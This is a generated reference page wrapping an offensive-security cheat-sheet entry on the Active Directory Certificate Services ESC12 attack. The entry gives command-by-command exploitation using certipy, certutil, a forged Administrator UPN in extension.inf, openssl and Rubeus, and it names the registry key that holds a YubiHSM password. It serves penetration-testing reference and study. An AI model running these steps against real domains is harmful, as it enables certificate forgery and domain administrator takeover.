---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Active Directory - Certificate ESC12

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-adcs-esc12` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc12.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Active Directory - Certificate ESC12](../../topics/active-directory/active-directory-certificate-esc12.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-ad-adcs-esc12 |
| name | Active Directory - Certificate ESC12 |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-adcs-esc12.md |

## Preserved Source Material

````yaml
_body: "# Active Directory - Certificate ESC12\n\n## ESC12 - ADCS CA on YubiHSM\n\n> The ESC12 vulnerability occurs when a\
  \ Certificate Authority (CA) stores its private key on a YubiHSM2 device, which requires an authentication key (password)\
  \ to access. This password is stored in the registry in cleartext, allowing an attacker with shell access to the CA server\
  \ to recover the private key.\n\n**Requirements**:\n\n* CA certificate\n* Shell access on the root CA server\n\n**Exploitation**:\n\
  \n* Generate a certicate for the user\n\n  ```ps1\n  certipy req -target dc-esc.esc.local -dc-ip 10.10.10.10 -u \"user_esc12@esc.local\"\
  \ -p 'P@ssw0rd' -template User -ca <CA-Common-Name>\n  certipy cert -pfx user_esc12.pfx -nokey -out user_esc12.crt\n  certipy\
  \ cert -pfx user_esc12.pfx -nocert -out user_esc12.key\n  ```\n\n* Importing the CA certificate into the user store\n\n\
  \  ```ps1\n  certutil -addstore -user my .\\Root-CA-5.cer\n  ```\n\n* Associated with the private key in the YubiHSM2 device\n\
  \n  ```ps1\n  certutil -csp \"YubiHSM Key Storage Provider\" -repairstore -user my <CA-Common-Name>\n  ```\n\n* Sign `user_esc12.crt`\
  \ and specify a `Subject Alternative Name` using the `extension.inf` file.\n\n  ```ps1\n  certutil -sign ./user_esc12.crt\
  \ new.crt @extension.inf\n  ```\n\n* Content of extension.inf\n\n  ```cs\n  [Extensions]\n  2.5.29.17 = \"{text}\"\n  _continue_\
  \ = \"UPN=Administrator@esc.local&\"\n  ```\n\n* Use the certificate to get the TGT of the Administrator\n\n  ```ps1\n \
  \ openssl.exe pkcs12 -export -in new.crt -inkey user_esc12.key -out user_esc12_Administrator.pfx\n  Rubeus.exe asktgt /user:Administrator\
  \ /certificate:user_esc12_Administrator.pfx /domain:esc.local /dc:192.168.1.2 /show /nowrap\n  ```\n\nUnlocking the YubiHSM\
  \ with the plaintext password in the registry key: `HKEY_LOCAL_MACHINE\\SOFTWARE\\Yubico\\YubiHSM\\AuthKeysetPassword`.\n\
  \n## References\n\n* [ESC12 – Shell access to ADCS CA with YubiHSM - hajo - October 2023](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)\n\
  * [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)\n\
  * [Exploitation de l’AD CS : ESC12, ESC13 et ESC14 - Guillon Bony Rémi - February, 2025](https://connect.ed-diamond.com/misc/mischs-031/exploitation-de-l-ad-cs-esc12-esc13-et-esc14)"
_relative_path: active-directory/ad-adcs-esc12.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc12.md
````
